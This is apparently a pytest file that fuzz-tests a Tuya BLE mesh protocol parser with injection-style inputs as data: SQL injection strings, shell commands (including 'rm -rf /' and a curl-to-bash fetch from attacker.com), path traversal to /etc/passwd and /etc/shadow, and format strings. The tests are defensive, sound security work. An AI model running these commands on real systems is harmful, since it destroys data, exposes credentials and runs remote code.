"""Protocol injection attack tests.

Verifies that protocol parsers reject malformed inputs that could
be used for injection attacks - SQL injection patterns, command
injection, format string attacks, and path traversal.
"""

from __future__ import annotations

import struct
import sys
import typing
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "lib"))

import contextlib

from tuya_ble_mesh.exceptions import TuyaBLEMeshError
from tuya_ble_mesh.protocol import (
    decode_command_packet,
    decode_dp_value,
    decrypt_notification,
    parse_pair_response,
)

_FUZZ_KEY = b"\x00" * 16
_FUZZ_MAC = b"\x00" * 6
_ALLOWED_EXCEPTIONS = (TuyaBLEMeshError,)


class TestSQLInjectionPatterns:
    """Test protocol parsers reject SQL injection patterns."""

    _SQL_INJECTION_PATTERNS: typing.ClassVar[list[bytes]] = [
        b"'; DROP TABLE devices; --",
        b"' OR '1'='1",
        b"admin'--",
        b"' UNION SELECT * FROM secrets--",
        b"1' AND '1'='1",
        b"\x00' OR 1=1; --",
        b"' OR 'x'='x",
    ]

    def test_sql_in_dp_value(self) -> None:
        """DP string values with SQL patterns must not crash."""
        for pattern in self._SQL_INJECTION_PATTERNS:
            # Create valid TLV header for string type
            dp_id = 1
            dp_type = 3  # DP_TYPE_STRING
            val_len = len(pattern)
            header = struct.pack(">BBH", dp_id, dp_type, val_len)
            data = header + pattern

            try:
                result = decode_dp_value(data)
                # Should parse but keep pattern as-is (no SQL execution)
                assert isinstance(result, tuple)
            except _ALLOWED_EXCEPTIONS:
                pass  # Rejection is acceptable

    def test_sql_in_notification(self) -> None:
        """Notifications with SQL patterns must not crash."""
        for pattern in self._SQL_INJECTION_PATTERNS:
            # Pad to valid notification size
            data = pattern[:30].ljust(20, b"\x00")
            with contextlib.suppress(_ALLOWED_EXCEPTIONS):
                decrypt_notification(_FUZZ_KEY, _FUZZ_MAC, data)


class TestCommandInjectionPatterns:
    """Test protocol parsers reject command injection patterns."""

    _COMMAND_INJECTION_PATTERNS: typing.ClassVar[list[bytes]] = [
        b"; rm -rf /",
        b"| cat /etc/passwd",
        b"`whoami`",
        b"$(id)",
        b"& ping -c 10 attacker.com &",
        b"\x00bash -i",
        b"; curl attacker.com/shell.sh | bash",
    ]

    def test_command_in_dp_value(self) -> None:
        """DP values with shell commands must not execute."""
        for pattern in self._COMMAND_INJECTION_PATTERNS:
            dp_id = 1
            dp_type = 3  # STRING
            val_len = len(pattern)
            header = struct.pack(">BBH", dp_id, dp_type, val_len)
            data = header + pattern

            try:
                result = decode_dp_value(data)
                # Should parse but never execute
                assert isinstance(result, tuple)
            except _ALLOWED_EXCEPTIONS:
                pass

    def test_command_in_pair_response(self) -> None:
        """Pair responses with shell commands must not execute."""
        for pattern in self._COMMAND_INJECTION_PATTERNS:
            data = b"\x0d" + pattern[:8].ljust(8, b"\x00")
            with contextlib.suppress(_ALLOWED_EXCEPTIONS):
                parse_pair_response(data)


class TestFormatStringAttacks:
    """Test protocol parsers reject format string attack patterns."""

    _FORMAT_STRING_PATTERNS: typing.ClassVar[list[bytes]] = [
        b"%s%s%s%s%s%s%s%s",
        b"%x%x%x%x%x%x%x%x",
        b"%n%n%n%n%n%n%n%n",
        b"%.1000000d",
        b"%08x.%08x.%08x.%08x",
        b"%p%p%p%p%p%p%p%p",
    ]

    def test_format_strings_in_dp_value(self) -> None:
        """DP values with format strings must not cause crashes."""
        for pattern in self._FORMAT_STRING_PATTERNS:
            dp_id = 1
            dp_type = 3  # STRING
            val_len = len(pattern)
            header = struct.pack(">BBH", dp_id, dp_type, val_len)
            data = header + pattern

            try:
                result = decode_dp_value(data)
                assert isinstance(result, tuple)
            except _ALLOWED_EXCEPTIONS:
                pass

    def test_format_strings_in_notification(self) -> None:
        """Notifications with format strings must not leak memory."""
        for pattern in self._FORMAT_STRING_PATTERNS:
            data = pattern[:20].ljust(20, b"\x00")
            with contextlib.suppress(_ALLOWED_EXCEPTIONS):
                decrypt_notification(_FUZZ_KEY, _FUZZ_MAC, data)


class TestPathTraversalAttacks:
    """Test protocol parsers reject path traversal patterns."""

    _PATH_TRAVERSAL_PATTERNS: typing.ClassVar[list[bytes]] = [
        b"../../etc/passwd",
        b"..\\..\\windows\\system32",
        b"....//....//etc/shadow",
        b"/etc/passwd%00.txt",
        b"..%2F..%2F..%2Fetc%2Fpasswd",
        b"..;/etc/passwd",
    ]

    def test_path_traversal_in_dp_value(self) -> None:
        """DP values with path traversal must not access files."""
        for pattern in self._PATH_TRAVERSAL_PATTERNS:
            dp_id = 1
            dp_type = 3  # STRING
            val_len = len(pattern)
            header = struct.pack(">BBH", dp_id, dp_type, val_len)
            data = header + pattern

            try:
                result = decode_dp_value(data)
                # Should parse but never access filesystem
                assert isinstance(result, tuple)
            except _ALLOWED_EXCEPTIONS:
                pass


class TestNullByteInjection:
    """Test protocol parsers handle null bytes correctly."""

    def test_null_byte_truncation_in_strings(self) -> None:
        """Null bytes should not cause premature string termination."""
        payload = b"admin\x00' OR '1'='1"
        dp_id = 1
        dp_type = 3  # STRING
        val_len = len(payload)
        header = struct.pack(">BBH", dp_id, dp_type, val_len)
        data = header + payload

        try:
            _dp_id_out, _dp_type_out, value = decode_dp_value(data)
            # If parsed successfully, ensure full length is preserved
            if isinstance(value, bytes):
                assert len(value) == len(payload), "Null byte caused truncation"
        except _ALLOWED_EXCEPTIONS:
            pass

    def test_null_byte_in_packet(self) -> None:
        """Null bytes in packet should not cause buffer issues."""
        packet = b"\x00" * 10 + b"\xff" * 10
        with contextlib.suppress(_ALLOWED_EXCEPTIONS):
            decode_command_packet(_FUZZ_KEY, _FUZZ_MAC, packet)


class TestBufferOverflowPatterns:
    """Test protocol parsers reject buffer overflow attempts."""

    def test_oversized_dp_length_field(self) -> None:
        """DP with claimed length > actual data must reject."""
        dp_id = 1
        dp_type = 3  # STRING
        claimed_len = 1000  # Claim 1000 bytes
        actual_payload = b"X" * 10  # Only provide 10
        header = struct.pack(">BBH", dp_id, dp_type, claimed_len)
        data = header + actual_payload

        with pytest.raises(_ALLOWED_EXCEPTIONS):
            decode_dp_value(data)

    def test_negative_length_field(self) -> None:
        """DP with negative length (via signed overflow) must reject."""
        dp_id = 1
        dp_type = 3
        # Use signed interpretation of 0xFFFF = -1
        header = struct.pack(">BBH", dp_id, dp_type, 0xFFFF)
        data = header + b"A" * 10

        with pytest.raises(_ALLOWED_EXCEPTIONS):
            decode_dp_value(data)

    def test_repeated_long_dps(self) -> None:
        """Many oversized DP claims must not cause memory exhaustion."""
        for _ in range(100):
            dp_id = 1
            dp_type = 3
            claimed_len = 0xFFFE  # Max u16
            header = struct.pack(">BBH", dp_id, dp_type, claimed_len)
            data = header + b"X" * 10

            with contextlib.suppress(_ALLOWED_EXCEPTIONS):
                decode_dp_value(data)


class TestUnicodeExploits:
    """Test protocol parsers handle dangerous Unicode correctly."""

    _UNICODE_EXPLOITS: typing.ClassVar[list[bytes]] = [
        b"\xc0\x80",  # Overlong encoding of NULL
        b"\xf0\x9f\x92\xa9" * 100,  # Many emoji (memory test)
        b"\xe2\x80\x8f" * 50,  # RTL override spam
        b"\xed\xa0\x80\xed\xb0\x80",  # UTF-16 surrogate pair (invalid UTF-8)
    ]

    def test_unicode_exploits_in_dp_strings(self) -> None:
        """DP strings with Unicode exploits must not crash."""
        for exploit in self._UNICODE_EXPLOITS:
            dp_id = 1
            dp_type = 3  # STRING
            val_len = len(exploit)
            header = struct.pack(">BBH", dp_id, dp_type, val_len)
            data = header + exploit

            with contextlib.suppress(_ALLOWED_EXCEPTIONS):
                decode_dp_value(data)
